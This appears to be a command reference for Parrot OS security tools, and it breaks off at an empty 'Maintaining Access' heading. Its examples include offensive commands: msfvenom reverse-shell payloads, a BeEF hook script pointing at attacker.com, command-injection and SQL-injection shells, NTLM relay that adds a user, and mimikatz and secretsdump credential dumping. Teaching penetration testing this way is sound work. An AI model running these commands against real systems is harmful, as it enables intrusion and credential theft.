# Parrot OS Security Edition — Complete Command-Line Tools Reference with Examples

> **Source**: [parrotsec.org](https://www.parrotsec.org) | [github.com/ParrotSec/parrot-tools](https://github.com/ParrotSec/parrot-tools) | Compiled June 2026
>
> Parrot OS Security Edition is a Debian-based Linux distro for penetration testing, digital forensics, reverse engineering, and privacy.
> Currently on **Parrot OS 7.x** (based on Debian 13 Trixie) with KDE Plasma as default desktop.
>
> Install the full tool suite: `sudo apt install parrot-tools-full`
> Install by category: `sudo apt install parrot-tools-infogathering` (etc.)
> Update system: `sudo parrot-upgrade`

---

## Table of Contents
1. [Privacy & Anonymity (Parrot-Unique)](#1-privacy--anonymity-parrot-unique)
2. [Information Gathering & Reconnaissance](#2-information-gathering--reconnaissance)
3. [Vulnerability Analysis](#3-vulnerability-analysis)
4. [Web Application Testing](#4-web-application-testing)
5. [Exploitation](#5-exploitation)
6. [Post Exploitation](#6-post-exploitation)
7. [Maintaining Access](#7-maintaining-access)
8. [Password Attacks](#8-password-attacks)
9. [Wireless Attacks](#9-wireless-attacks)
10. [Sniffing & Spoofing](#10-sniffing--spoofing)
11. [Digital Forensics](#11-digital-forensics)
12. [Reverse Engineering](#12-reverse-engineering)
13. [Cloud Penetration Testing](#13-cloud-penetration-testing)
14. [Automotive & SDR](#14-automotive--sdr)
15. [Reporting](#15-reporting)
16. [Cryptography & Encryption](#16-cryptography--encryption)
17. [System Management](#17-system-management)

---

## 1. Privacy & Anonymity (Parrot-Unique)

These tools are a key differentiator — Parrot ships with built-in anonymity infrastructure not found in Kali.

---

### `anonsurf` / `anonsurf-cli` / `anonsurf-gtk`
Parrot's own tool that routes ALL system traffic through Tor. Written in Nim with GTK and CLI interfaces.

```bash
# Start anonymous mode (all traffic → Tor)
sudo anonsurf start

# Stop anonymous mode
sudo anonsurf stop

# Check current status and IP
anonsurf status
anonsurf myip

# Change Tor identity (get new exit node)
anonsurf changeid

# Restart with new identity
sudo anonsurf restart

# Show current Tor IP
anonsurf ip

# CLI-only usage (no GUI required)
anonsurf-cli start
anonsurf-cli stop
anonsurf-cli status
```

---

### `tor`
Tor daemon — the underlying anonymization network.

```bash
# Start/stop Tor service
sudo systemctl start tor
sudo systemctl stop tor
sudo systemctl status tor

# Use as SOCKS5 proxy (default port 9050)
curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/

# Torify a specific command
torify curl https://check.torproject.org/
proxychains4 curl https://check.torproject.org/

# View Tor circuit info
nyx                              # Live Tor relay monitor (requires Tor control port)
```

---

### `nyx`
Live Tor relay monitor — shows bandwidth, circuit info, logs.

```bash
nyx                              # Launch interactive Tor monitor
# Requires: ControlPort 9051 in /etc/tor/torrc
# Shows: relay bandwidth, circuits, connections, logs
```

---

### `onionshare`
Share files anonymously over the Tor network.

```bash
onionshare file.zip              # Share a file (generates .onion address)
onionshare -r /folder/           # Share a directory recursively
onionshare --receive             # Receive files mode
onionshare --website /folder/    # Serve as a website
onionshare --chat                # Anonymous chat server
onionshare --persistent --key "key" file.zip  # Persistent address
```

---

### `mat2`
Remove metadata from files (images, PDFs, Office docs, etc.) before sharing.

```bash
mat2 photo.jpg                   # Remove EXIF from image
mat2 document.pdf                # Clean PDF metadata
mat2 presentation.pptx           # Clean Office metadata
mat2 --inplace photo.jpg         # Modify in place
mat2 -l photo.jpg                # List metadata (don't remove)
mat2 --unknown photo.jpg         # Show unknown/unhandled metadata
mat2 *.jpg                       # Batch clean all JPEGs
```

---

### `proxychains4`
Force any TCP connection through Tor or another SOCKS/HTTP proxy.

```bash
# Config: /etc/proxychains4.conf (add socks5 127.0.0.1 9050 for Tor)

proxychains4 nmap -sT -Pn 192.168.1.1         # nmap through Tor
proxychains4 sqlmap -u "http://target.com/?id=1" # sqlmap through Tor
proxychains4 curl http://target.com/           # curl through proxy
proxychains4 ssh user@192.168.1.100            # SSH through proxy
proxychains4 -q nmap -sT 192.168.1.1          # Quiet mode (hide proxychains output)
```

---

## 2. Information Gathering & Reconnaissance

---

### `nmap` / `zenmap`
The primary network scanner — host discovery, port scanning, service detection, OS fingerprinting.

```bash
# Host discovery
nmap -sn 192.168.1.0/24                       # Ping sweep (no port scan)
nmap -sn -PS22,80,443 192.168.1.0/24          # TCP SYN ping on specific ports

# Port scanning
nmap 192.168.1.100                             # Default scan (top 1000 ports)
nmap -p- 192.168.1.100                         # All 65535 ports
nmap -p 22,80,443,8080 192.168.1.100           # Specific ports
nmap -F 192.168.1.100                          # Fast scan (top 100 ports)

# Scan types
nmap -sS 192.168.1.100                         # SYN stealth scan
nmap -sT 192.168.1.100                         # TCP connect scan (no root needed)
nmap -sU 192.168.1.100                         # UDP scan
nmap -sA 192.168.1.100                         # ACK scan (firewall detection)
nmap -sV 192.168.1.100                         # Service/version detection
nmap -O 192.168.1.100                          # OS detection
nmap -A 192.168.1.100                          # Aggressive (OS+services+scripts+traceroute)

# Evasion
nmap -D RND:10 192.168.1.100                  # Decoy scan
nmap -f 192.168.1.100                          # Fragment packets
nmap --spoof-mac 0 192.168.1.100              # Random MAC spoofing
nmap -T0 192.168.1.100                         # Paranoid timing (slowest)
nmap -T4 192.168.1.100                         # Aggressive timing (fastest)

# NSE Scripts
nmap --script=vuln 192.168.1.100               # Run vuln detection scripts
nmap --script=http-headers 192.168.1.100       # Get HTTP headers
nmap --script=smb-vuln-ms17-010 192.168.1.100  # Check for EternalBlue
nmap --script=ssh-brute 192.168.1.100          # SSH brute force
nmap --script=ftp-anon 192.168.1.0/24          # Check FTP anonymous access
nmap --script="default and safe" 192.168.1.100  # Safe default scripts

# Output
nmap -oN scan.txt 192.168.1.100                # Normal text output
nmap -oX scan.xml 192.168.1.100                # XML output
nmap -oG scan.grep 192.168.1.100               # Grepable output
nmap -oA scan 192.168.1.100                    # All three formats
```

---

### `masscan`
Extremely fast network port scanner — scans the entire internet in minutes.

```bash
masscan 192.168.1.0/24 -p80,443               # Scan subnet for web ports
masscan 10.0.0.0/8 -p0-65535                  # Full port scan of a range
masscan 192.168.1.0/24 --rate 10000           # Limit to 10,000 pps
masscan 0.0.0.0/0 -p80 --rate 100000          # Scan entire internet (requires ISP permission)
masscan -iL targets.txt -p22                   # From target file
masscan 192.168.1.0/24 -p80 -oJ output.json   # JSON output
```

---

### `theharvester`
OSINT tool for email, domain, host, and employee name harvesting from public sources.

```bash
theHarvester -d target.com -b google         # Google search
theHarvester -d target.com -b all            # All sources
theHarvester -d target.com -b linkedin       # LinkedIn
theHarvester -d target.com -b shodan         # Shodan (requires API key)
theHarvester -d target.com -l 500 -b google  # Limit 500 results
theHarvester -d target.com -b google -f results  # Save to results.html/xml
```

---

### `recon-ng`
Full-featured web reconnaissance framework with modular design.

```bash
recon-ng                                       # Launch interactive console

# Inside recon-ng:
# marketplace install all                      # Install all modules
# workspaces create target_corp               # Create workspace
# db insert domains                            # Add a domain
# modules load recon/domains-hosts/hackertarget # Load a module
# options set SOURCE target.com               # Set target
# run                                          # Execute module
# show hosts                                   # Show discovered hosts
# show contacts                                # Show gathered contacts
```

---

### `gobuster`
Directory, DNS, and vhost brute-forcer using wordlists.

```bash
# Directory brute-force
gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com/ -w wordlist.txt -x php,html,txt
gobuster dir -u http://target.com/ -w wordlist.txt -t 50 -o results.txt

# DNS subdomain brute-force
gobuster dns -d target.com -w /usr/share/wordlists/dnsmap.txt
gobuster dns -d target.com -w subdomains.txt -i  # Show IPs

# Virtual host brute-force
gobuster vhost -u http://target.com/ -w subdomains.txt

# S3 bucket enumeration
gobuster s3 -w bucket_names.txt
```

---

### `dnsenum`
Comprehensive DNS enumeration — zone transfers, brute-force subdomains, Google scraping.

```bash
dnsenum target.com                             # Full enumeration
dnsenum --dnsserver 8.8.8.8 target.com        # Specific DNS server
dnsenum -f subdomains.txt target.com           # Subdomain brute-force
dnsenum --noreverse target.com                 # Skip reverse lookups
dnsenum --enum target.com                      # Aggressive enumeration
```

---

### `dnsmap`
Passive DNS network mapper and subdomain brute-forcer.

```bash
dnsmap target.com                              # Default brute-force
dnsmap target.com -w custom_wordlist.txt      # Custom wordlist
dnsmap target.com -r /tmp/results.txt         # Save results
```

---

### `enum4linux`
Enumerate Windows/Samba systems: users, shares, groups, policies.

```bash
enum4linux 192.168.1.100                       # Full enumeration
enum4linux -U 192.168.1.100                    # Users only
enum4linux -S 192.168.1.100                    # Shares only
enum4linux -P 192.168.1.100                    # Password policy
enum4linux -o 192.168.1.100                    # OS information
enum4linux -a 192.168.1.100                    # All options
enum4linux -u admin -p password 192.168.1.100  # Authenticated
```

---

### `smbclient`
Access SMB/CIFS file shares.

```bash
smbclient -L //192.168.1.100                   # List shares
smbclient //192.168.1.100/share                # Connect to share
smbclient //192.168.1.100/share -U admin       # Authenticated
smbclient //192.168.1.100/C$ -U admin -N       # No password
# Inside smbclient: ls, get, put, cd, mkdir, del
```

---

### `smbmap`
Enumerate SMB shares and permissions.

```bash
smbmap -H 192.168.1.100                        # List shares (anonymous)
smbmap -H 192.168.1.100 -u admin -p password   # Authenticated
smbmap -H 192.168.1.100 -r share_name          # Recursively list share
smbmap -H 192.168.1.100 --download 'share\file.txt'  # Download file
```

---

### `netdiscover`
Active/passive ARP host discovery.

```bash
sudo netdiscover                               # Auto-discover all interfaces
sudo netdiscover -r 192.168.1.0/24            # Specific range
sudo netdiscover -p                            # Passive mode (no packets sent)
sudo netdiscover -i eth0                       # Specific interface
```

---

### `autorecon`
Multi-threaded reconnaissance tool that runs nmap, web, and service-specific scans automatically.

```bash
sudo autorecon 192.168.1.100                   # Full scan of single target
sudo autorecon 192.168.1.0/24                  # Scan a subnet
sudo autorecon -t targets.txt                  # Multiple targets from file
sudo autorecon 192.168.1.100 --only-scans-dir  # Save to scans dir only
sudo autorecon 192.168.1.100 -o /output/       # Custom output directory
```

---

### `sherlock`
Find usernames across 300+ social networks.

```bash
sherlock username                              # Search across platforms
sherlock username1 username2                   # Multiple usernames
sherlock --timeout 10 username                 # Custom timeout
sherlock --output results.txt username         # Save results
sherlock --tor username                        # Through Tor
```

---

### `thc-ipv6`
Attack toolkit for IPv6 networks.

```bash
atk6-alive6 eth0                               # Detect alive IPv6 hosts
atk6-fake_router6 eth0 fe80::1               # Fake router advertisement
atk6-flood_router6 eth0                        # Router advertisement flood
atk6-fake_dhcps6 eth0 2001:db8:: 64          # Fake DHCPv6 server
```

---

### `hping3`
TCP/UDP/ICMP packet crafter for network testing.

```bash
hping3 -S 192.168.1.100 -p 80                 # SYN scan on port 80
hping3 -A 192.168.1.100 -p 80                 # ACK probe
hping3 -c 3 192.168.1.100                     # Send 3 ICMP pings
hping3 --flood -S 192.168.1.100 -p 80         # SYN flood
hping3 -2 192.168.1.100 -p 53                 # UDP packet to port 53
hping3 --traceroute -V -1 192.168.1.100       # Traceroute using ICMP
```

---

### `arp-scan`
Layer 2 ARP host discovery.

```bash
sudo arp-scan -l                               # Scan local network
sudo arp-scan 192.168.1.0/24                   # Scan subnet
sudo arp-scan --interface=eth0 192.168.1.0/24  # Specific interface
```

---

### `sslyze`
Fast, deep SSL/TLS configuration analyzer.

```bash
sslyze target.com                              # Full SSL/TLS scan
sslyze target.com --heartbleed                 # Check for Heartbleed
sslyze target.com --robot                      # ROBOT attack check
sslyze target.com --certinfo                   # Certificate details
sslyze target.com --json_out results.json      # JSON output
sslyze target.com:8443                         # Non-standard port
sslyze --targets_in targets.txt               # Scan from file
```

---

### `sslscan`
Quick SSL/TLS cipher and vulnerability scanner.

```bash
sslscan target.com                             # Scan SSL/TLS config
sslscan target.com:8443                        # Non-standard port
sslscan --no-colour target.com                 # Plain output
sslscan --xml=output.xml target.com            # XML output
sslscan --show-sigs target.com                # Show signature algorithms
```

---

### `p0f`
Passive OS fingerprinting from traffic.

```bash
sudo p0f -i eth0                               # Live passive fingerprinting
sudo p0f -r capture.pcap                       # From pcap file
sudo p0f -i eth0 -o /tmp/p0f.log              # Log to file
```

---

### `dmitry`
Deep information gathering — whois, IP, port scan, email harvesting.

```bash
dmitry -winsepo results.txt target.com         # Full whois + port + email scan
dmitry -w target.com                           # Whois only
dmitry -i 192.168.1.100                        # Reverse IP lookup
dmitry -s target.com                           # Subdomain search
dmitry -e target.com                           # Email search
dmitry -p target.com                           # Port scan
```

---

### `instaloader`
Download Instagram profiles, posts, stories, and metadata.

```bash
instaloader profile username                   # Download profile
instaloader --no-pictures profile username     # Metadata only
instaloader --stories username                 # Download stories
instaloader -- "#hashtag"                      # Download by hashtag
```

---

## 3. Vulnerability Analysis

---

### `gvm` (Greenbone Vulnerability Manager / OpenVAS)
Enterprise-grade vulnerability scanner.

```bash
# Initial setup
sudo gvm-setup                                 # First-time setup (takes time)
sudo gvm-start                                 # Start all services
sudo gvm-check-setup                           # Verify installation

# Access web interface
# https://127.0.0.1:9392 (admin / auto-generated password from gvm-setup)

# CLI scanning
gvm-cli --gmp-username admin --gmp-password pass socket --socketpath /run/gvmd/gvmd.sock --xml "<authenticate><credentials><username>admin</username><password>pass</password></credentials></authenticate>"
```

---

### `nikto`
Web server vulnerability scanner.

```bash
nikto -h http://192.168.1.100                  # Basic scan
nikto -h http://192.168.1.100 -p 8080          # Specific port
nikto -h https://192.168.1.100 -ssl            # HTTPS
nikto -h http://192.168.1.100 -o results.html -Format htm  # HTML report
nikto -h http://192.168.1.100 -T 9             # SQL injection tests
nikto -h http://192.168.1.100 -useproxy http://127.0.0.1:8080  # Via proxy
nikto -h http://192.168.1.100 -Tuning 1,2,3    # Specific tuning tests
nikto -h http://192.168.1.100 -C all           # All CGI directories
```

---

### `lynis`
Security auditing tool for Linux/macOS systems.

```bash
sudo lynis audit system                        # Full system audit
sudo lynis audit system --quick                # Quick scan
sudo lynis audit system --pentest             # Penetration test mode
sudo lynis show controls                       # List all security controls
sudo lynis show details HRDN-7222             # Details on a specific test
lynis audit system --logfile /tmp/lynis.log   # Save log
lynis update info                              # Check for updates
```

---

### `unix-privesc-check`
Check for privilege escalation vectors on Unix systems.

```bash
unix-privesc-check standard                    # Standard checks
unix-privesc-check detailed                    # Detailed output
unix-privesc-check standard 2>&1 | grep -i "warn\|issue"  # Filter warnings
```

---

### `slowhttptest`
Test web servers for Slow HTTP attack vulnerabilities (Slowloris, RUDY, etc.).

```bash
slowhttptest -c 1000 -H -g -o report -m 10 -i 10 -r 200 -t GET -u http://target.com/ -x 24 -p 3
# -c 1000     = 1000 connections
# -H          = slow headers (Slowloris mode)
# -B          = slow body (RUDY mode)
# -p 3        = probe after 3 seconds
slowhttptest -c 500 -B -u http://target.com/login.php  # POST body mode
```

---

### `afl` (American Fuzzy Lop)
Fuzzing tool for finding bugs in programs via instrumented binary testing.

```bash
# Compile target with AFL instrumentation
afl-gcc -o target_afl target.c                 # Instrumented compilation
afl-g++ -o target_afl target.cpp

# Run fuzzer
mkdir input output
echo "test" > input/seed
afl-fuzz -i input/ -o output/ -- ./target_afl @@   # Fuzz with file input
afl-fuzz -i input/ -o output/ -t 1000 -- ./target @@  # With timeout

# View results
ls output/crashes/                             # Crash-causing inputs
ls output/hangs/                               # Timeout-causing inputs
afl-tmin -i output/crashes/id:000000 -o min.bin -- ./target @@  # Minimize crash
```

---

### `yersinia`
Layer 2 protocol attack tool (STP, CDP, DTP, VTP, DHCP, HSRPv1).

```bash
sudo yersinia -I                               # Interactive mode (ncurses)
sudo yersinia dhcp -attack 1                   # DHCP starvation attack
sudo yersinia stp -attack 2                    # STP attack (become root bridge)
sudo yersinia dtp -attack 1 -interface eth0    # DTP attack
```

---

## 4. Web Application Testing

---

### `burpsuite`
The primary web application security testing platform.

```bash
# Launch GUI
burpsuite

# Proxy configuration: set browser to 127.0.0.1:8080
# Import Burp CA cert to browser for HTTPS interception

# Key features:
# Proxy     - Intercept and modify HTTP/S requests
# Scanner   - Active/passive vulnerability scanning (Pro)
# Intruder  - Brute force / fuzzing positions
# Repeater  - Manually resend and modify requests
# Decoder   - Encode/decode data (URL, Base64, etc.)
# Sequencer - Token randomness analysis

# Run from command line with custom config:
burpsuite --config-file=/path/to/config.json
```

---

### `caido`
Modern web application security testing tool (Burp Suite alternative).

```bash
caido                                          # Launch (opens in browser)
# Default: http://127.0.0.1:7777
# Set browser proxy to 127.0.0.1:8080
```

---

### `zaproxy` (OWASP ZAP)
Open-source web application security scanner.

```bash
zaproxy                                        # Launch GUI
zaproxy -daemon                                # Run as daemon (API mode)
zaproxy -daemon -port 8090                     # Custom port

# CLI scanning
zaproxy -cmd -quickurl http://target.com/ -quickprogress -quickout /tmp/report.html
zaproxy -cmd -autorun /path/to/plan.yaml      # Run automation plan
```

---

### `sqlmap`
Automated SQL injection detection and exploitation tool.

```bash
sqlmap -u "http://target.com/?id=1"            # Basic injection test
sqlmap -u "http://target.com/?id=1" --dbs      # Enumerate databases
sqlmap -u "http://target.com/?id=1" -D db_name --tables  # List tables
sqlmap -u "http://target.com/?id=1" -D db -T users --dump  # Dump table
sqlmap -u "http://target.com/?id=1" --os-shell  # OS shell (if possible)
sqlmap -u "http://target.com/?id=1" --level=5 --risk=3  # Max detection
sqlmap -u "http://target.com/?id=1" --technique BEUSTQ   # All techniques
sqlmap -r request.txt                          # From Burp request file
sqlmap -u "http://target.com/?id=1" --batch   # Non-interactive mode
sqlmap -u "http://target.com/?id=1" --tor --tor-type=SOCKS5  # Through Tor
sqlmap -u "http://target.com/?id=1" --tamper=space2comment   # Evasion tamper
sqlmap -u "http://target.com/?id=1" --cookie="session=abc"   # With cookie
sqlmap -u "http://target.com/login" --data="user=a&pass=b"   # POST request
```

---

### `nikto`
See Vulnerability Analysis section.

---

### `dirb`
Directory and file brute-forcer using wordlists.

```bash
dirb http://target.com/                        # Default wordlist scan
dirb http://target.com/ /usr/share/wordlists/dirb/big.txt  # Custom wordlist
dirb http://target.com/ -a "Mozilla/5.0"      # Custom User-Agent
dirb http://target.com/ -c "COOKIE=value"     # With cookie
dirb http://target.com/ -z 100                 # 100ms delay between requests
dirb http://target.com/ -o results.txt         # Save output
dirb http://target.com/ -X .php,.html,.txt    # Try extensions
```

---

### `ffuf`
Fast web fuzzer — directories, subdomains, parameters, vhosts.

```bash
# Directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ
ffuf -w wordlist.txt -u http://target.com/FUZZ -e .php,.html,.txt

# Subdomain fuzzing
ffuf -w subdomains.txt -H "Host: FUZZ.target.com" -u http://target.com/

# Parameter fuzzing
ffuf -w params.txt -u "http://target.com/page.php?FUZZ=test"

# POST data fuzzing
ffuf -w payloads.txt -X POST -d "user=FUZZ&pass=test" -u http://target.com/login

# Filter by response size/code
ffuf -w wordlist.txt -u http://target.com/FUZZ -fc 404,403  # Filter codes
ffuf -w wordlist.txt -u http://target.com/FUZZ -fs 1234      # Filter size
ffuf -w wordlist.txt -u http://target.com/FUZZ -mc 200,301   # Match codes

# Rate limiting
ffuf -w wordlist.txt -u http://target.com/FUZZ -rate 100    # 100 req/sec
```

---

### `wfuzz`
Web fuzzer for finding hidden resources, parameters, and vulnerabilities.

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://target.com/FUZZ
wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ  # Hide 404
wfuzz -c -z file,payloads.txt -d "user=FUZZ" http://target.com/login
wfuzz -c -z file,words.txt -H "Cookie: session=abc" http://target.com/FUZZ
wfuzz -c -z range,1-100 http://target.com/user/FUZZ            # Number range
```

---

### `whatweb`
Identify web technologies, CMS, frameworks, and server software.

```bash
whatweb http://target.com                      # Basic identification
whatweb http://target.com -v                   # Verbose output
whatweb http://target.com -a 3                 # Aggressive scan (level 1-4)
whatweb -i targets.txt                         # Multiple targets from file
whatweb http://target.com -o results.json --log-json  # JSON output
```

---

### `wafw00f`
Detect and fingerprint Web Application Firewalls (WAF).

```bash
wafw00f http://target.com                      # Detect WAF
wafw00f -a http://target.com                   # Try all WAF tests
wafw00f -l                                     # List known WAFs
wafw00f http://target.com -o json              # JSON output
wafw00f http://target.com -p http://127.0.0.1:8080  # Through proxy
```

---

### `wpscan`
WordPress vulnerability scanner.

```bash
wpscan --url http://target.com                 # Basic WordPress scan
wpscan --url http://target.com --enumerate u   # Enumerate users
wpscan --url http://target.com --enumerate p   # Enumerate plugins
wpscan --url http://target.com --enumerate t   # Enumerate themes
wpscan --url http://target.com --enumerate vp  # Vulnerable plugins only
wpscan --url http://target.com -U admin -P wordlist.txt  # Brute-force login
wpscan --url http://target.com --api-token YOUR_TOKEN     # Use WPScan API
```

---

### `joomscan`
Joomla CMS vulnerability scanner.

```bash
joomscan -u http://target.com                  # Basic Joomla scan
joomscan -u http://target.com --enumerate-components  # Enumerate components
joomscan -u http://target.com -ec              # Enumerate components (short)
joomscan -u http://target.com --random-agent  # Random User-Agent
```

---

### `commix`
Automated command injection testing and exploitation tool.

```bash
commix --url="http://target.com/?cmd=id"       # Basic test
commix --url="http://target.com/page.php" --data="user=admin&cmd=INJECT_HERE"
commix --url="http://target.com/?id=1" --os-cmd="cat /etc/passwd"  # Run command
commix --url="http://target.com/?id=1" --os-shell  # Interactive shell
commix -r request.txt                           # From Burp request file
```

---

### `xsser`
Automated XSS detection and exploitation framework.

```bash
xsser --url "http://target.com/?q=XSS"        # Basic XSS test
xsser --url "http://target.com/?q=" -p "XSS"  # In POST data
xsser --url "http://target.com/?q=XSS" --auto # Auto-detect XSS type
xsser --url "http://target.com/?q=" -s        # Statistics
xsser --url "http://target.com/?q=XSS" --payload '<script>alert(1)</script>'
```

---

### `davtest`
Test WebDAV servers for PUT/upload vulnerabilities.

```bash
davtest -url http://target.com/dav/            # Basic test
davtest -url http://target.com/dav/ -auth admin:password  # Authenticated
davtest -url http://target.com/dav/ -uploadfile shell.php  # Upload specific file
```

---

## 5. Exploitation

---

### `metasploit-framework` (msfconsole)
The premier exploitation framework.

```bash
# Start Metasploit
msfconsole                                     # Interactive console
msfconsole -q                                  # Quiet mode (no banner)
msfconsole -x "use exploit/ms17_010_eternalblue; set RHOSTS 192.168.1.100; run"  # CLI

# Database setup
sudo msfdb init                                # Initialize PostgreSQL database
sudo msfdb start                               # Start database
msfconsole -q -x "db_status"                  # Check DB status

# Common console commands:
# search eternalblue              - Search for modules
# use exploit/windows/smb/ms17_010_eternalblue  - Select module
# info                            - Show module info
# show options                    - Show required options
# set RHOSTS 192.168.1.100        - Set target
# set LHOST 192.168.1.50          - Set local host
# set PAYLOAD windows/x64/meterpreter/reverse_tcp  - Set payload
# run / exploit                   - Execute exploit
# sessions -l                     - List sessions
# sessions -i 1                   - Interact with session 1
# background                      - Background current session
# db_nmap -sV 192.168.1.0/24     - Nmap into DB
# hosts                           - View discovered hosts
# vulns                           - View found vulnerabilities

# MSF Venom - payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o payload.elf
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php
msfvenom -l payloads                           # List all payloads
msfvenom -l encoders                           # List encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe
```

---

### `armitage`
Graphical cybersecurity tool for Metasploit — team collaboration interface.

```bash
armitage                                       # Launch GUI (requires msfdb running)
```

---

### `sqlmap`
See Web Application Testing section.

---

### `beef-xss`
Browser Exploitation Framework — hook browsers via XSS and execute modules.

```bash
sudo beef-xss                                  # Start BeEF
# Access: http://127.0.0.1:3000/ui/panel
# Hook URL: http://127.0.0.1:3000/hook.js
# Inject hook: <script src="http://attacker.com:3000/hook.js"></script>
```

---

### `set` (Social Engineering Toolkit)
Framework for human-centered attack vectors — phishing, credential harvesting, etc.

```bash
sudo setoolkit                                 # Launch interactive menu

# Key modules (via menu):
# 1 - Social-Engineering Attacks
#   1 - Spear-Phishing Attack Vectors
#   2 - Website Attack Vectors
#     1 - Java Applet Attack
#     2 - Metasploit Browser Exploit
#     3 - Credential Harvester Attack (clone a site)
#   3 - Infectious Media Generator
#   4 - Create a Payload and Listener
```

---

### `evil-winrm`
WinRM shell for penetration testing.

```bash
evil-winrm -i 192.168.1.100 -u administrator -p password
evil-winrm -i 192.168.1.100 -u admin -H "NTLM_HASH"    # Pass-the-hash
evil-winrm -i 192.168.1.100 -u admin -p pass -s /tmp/scripts/  # Load scripts
evil-winrm -i 192.168.1.100 -u admin -p pass -e /tmp/executables/  # Upload execs

# Inside WinRM shell:
# upload local.exe
# download remote.txt
# Invoke-PowerShellTcp.ps1   # Load PowerShell scripts
```

---

### `netexec` (formerly CrackMapExec)
Network exploitation and credential spraying for Windows environments.

```bash
netexec smb 192.168.1.0/24                     # Enumerate SMB hosts
netexec smb 192.168.1.100 -u admin -p password # Auth test
netexec smb 192.168.1.0/24 -u admin -p pass --sam  # Dump SAM
netexec smb 192.168.1.0/24 -u admin -p pass --lsa  # Dump LSA secrets
netexec smb 192.168.1.0/24 -u user -p pass --shares # List shares
netexec smb 192.168.1.100 -u admin -p pass -x "whoami"  # Run command
netexec smb 192.168.1.100 -u admin -p pass -M mimikatz  # Run module
netexec winrm 192.168.1.100 -u admin -p pass  # WinRM test
netexec ldap 192.168.1.100 -u admin -p pass   # LDAP enumeration
netexec ssh 192.168.1.0/24 -u root -p pass    # SSH spray
netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt  # Spray
```

---

### `bloodhound`
Active Directory attack path mapping using graph theory.

```bash
# Collect data (use SharpHound.exe on target or bloodhound-python)
bloodhound-python -u admin -p password -d domain.local -c all -ns 192.168.1.100

# Start BloodHound
sudo neo4j start                               # Start Neo4j database
bloodhound                                     # Launch GUI

# Common BloodHound queries (inside GUI):
# "Find all Domain Admins"
# "Shortest Path to Domain Admins"
# "Find Computers where Domain Users are local Admin"
# "Find AS-REP Roastable Users"
# "Find Kerberoastable Accounts"
```

---

### `mimikatz`
Extract credentials from Windows memory.

```bash
# Run on Windows target (packaged in Parrot)
mimikatz.exe

# Key mimikatz commands:
# privilege::debug              - Enable debug privilege
# sekurlsa::logonpasswords      - Dump all logged-on credentials
# sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe  - Pass-the-hash
# lsadump::sam                  - Dump SAM database
# lsadump::dcsync /user:Administrator  - DCSync attack
# kerberos::list                # List Kerberos tickets
# kerberos::golden              # Create golden ticket
# vault::cred                   # Vault credentials

# From Linux (via RPC):
impacket-secretsdump admin:password@192.168.1.100
```

---

### `kerberoast`
Perform Kerberoasting attacks to crack service account hashes offline.

```bash
# Request service tickets and export hashes
python3 /usr/share/kerberoast/GetUserSPNs.py domain.local/user:password -dc-ip 192.168.1.100 -request
python3 /usr/share/kerberoast/GetUserSPNs.py domain.local/user:password -request -outputfile hashes.txt

# Crack the hashes
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=krb5tgs hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

### `impacket-scripts`
Python implementations of Windows network protocols — the core AD attack toolkit.

```bash
# Pass-the-hash
impacket-psexec admin@192.168.1.100 -hashes :NTLM_HASH

# Remote command execution
impacket-psexec admin:password@192.168.1.100
impacket-wmiexec admin:password@192.168.1.100
impacket-smbexec admin:password@192.168.1.100

# Credential dumping
impacket-secretsdump admin:password@192.168.1.100  # Full secrets dump
impacket-secretsdump -hashes :HASH admin@192.168.1.100  # With NTLM
impacket-secretsdump -just-dc DOMAIN/admin:password@DC_IP  # DC secrets only

# Kerberos attacks
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.100 -request  # Kerberoast
impacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.100  # AS-REP Roast
impacket-ticketer -nthash HASH -domain-sid S-1-5-21-... -domain domain.local Administrator  # Golden ticket

# SMB relay
impacket-ntlmrelayx -tf targets.txt -smb2support
impacket-ntlmrelayx -tf targets.txt -smb2support -c "net user hacker pass /add"

# Other tools
impacket-smbserver share /tmp/ -smb2support    # Stand up SMB share
impacket-rpcdump 192.168.1.100                 # RPC endpoint enumeration
impacket-lookupsid admin:password@192.168.1.100 # SID enumeration
```

---

## 6. Post Exploitation

---

### `peass` (PEASS-ng) / `linpeas` / `winpeas`
Privilege Escalation Awesome Scripts — automated local privilege escalation checks.

```bash
# Linux privilege escalation
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh                                   # Run all checks
./linpeas.sh -a                                # All checks (more thorough)
./linpeas.sh -e                                # Extra enumeration

# Windows privilege escalation (run on target)
winPEAS.bat                                    # Batch version
winPEASx64.exe                                 # 64-bit executable

# Filter output by severity
./linpeas.sh 2>/dev/null | tee output.txt
cat output.txt | grep -E "\[PE\]|\[+\]"        # Filter PE findings
```

---

### `linux-exploit-suggester`
Suggest kernel exploits based on the running kernel version.

```bash
./linux-exploit-suggester.sh                   # Check current kernel
./linux-exploit-suggester.sh -k 4.4.0          # Check specific version
./linux-exploit-suggester.sh --full            # Full detailed output
```

---

### `lynis`
See Vulnerability Analysis section (also useful post-compromise).

---

### `powersploit`
PowerShell post-exploitation framework.

```bash
# PowerShell usage (on Windows target or via evil-winrm):
Import-Module PowerSploit

# Privilege escalation
Invoke-AllChecks                               # Check for privesc vectors

# Credential dumping
Invoke-Mimikatz                               # Run Mimikatz from memory

# Persistence
Add-Persistence -ScriptBlock { ... } -Trigger AtLogon

# Recon
Invoke-ShareFinder                             # Find network shares
Invoke-EnumerateLocalAdmin                     # Find local admins
```

---

## 7. Maintaining Access

---

### `weevely`
